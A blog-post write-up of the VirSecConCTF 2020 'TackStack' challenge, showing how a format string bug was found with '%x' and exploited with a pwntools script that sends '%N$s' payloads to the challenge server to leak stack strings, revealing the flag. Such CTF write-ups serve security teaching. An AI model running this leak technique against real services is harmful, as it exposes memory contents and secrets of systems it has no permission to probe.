---
layout: post
title: VirSecConCTF 2020 - TackStack
excerpt: "Writeup for data leak challenge from VirSecConCTF 2020"
categories: [pwn]
---

Tackstack was a 100 point challenge during VirSecConCTF 2020. It was actually very simple, but somehow only accumulated 59 solves. The challenge gives us a command to connect to the challenge. No source code is provided. Below is a snapshot of the challenge server in action. Basically it allows us to type in "tacks" to be added to the stack.

```
michael@computer:~/Documents/CTF/virseccon/tackstack$ nc jh2i.com 50038
========================
|       TACKSTACK      |
========================


Welcome to TackStack!
How to play:
  * Stack your tacks!
Ready? Go!

Your tack: tack
------------------------
|                      |
    tack
|                      |
------------------------

Your tack: tack2
------------------------
|                      |
    tack
    tack2
|                      |
------------------------

Your tack: %x
------------------------
|                      |
    tack
    tack2
    4030be
|                      |
------------------------
```

In the last prompt, where I entered `%x`, you can see that a hex number was returned. This indicates a format string vulnerability. Since we were not provided source code or a binary to attempt code redirection, I wrote a script to leak all strings off of the stack to see if there was anything useful.

{% highlight python %}
from pwn import *

context.log_level = 'error'

for i in range(100):

    r = remote('jh2i.com', 50038)

    r.recvuntil('Your tack: ')
    r.sendline('%{}$s'.format(i + 1))

    try: print(r.recvuntil('Your tack: ')[54:100].rstrip())
    except: print('EOF')
    
    r.close()

{% endhighlight %}

The script outputs lots of non-ascii junk, along with parts of the ascii-boxes, but around leak 100 we see something interesting.

```
|                      |
-------
FLAG=LLS{tack_stack?_more_like_stack_attack}
|
(null)
|                      |
--------------
EOF
```

We can see that the flag `LLS{tack_stack?_more_like_stack_attack}` was on the stack all along! This can be submitted for 100 challenge points.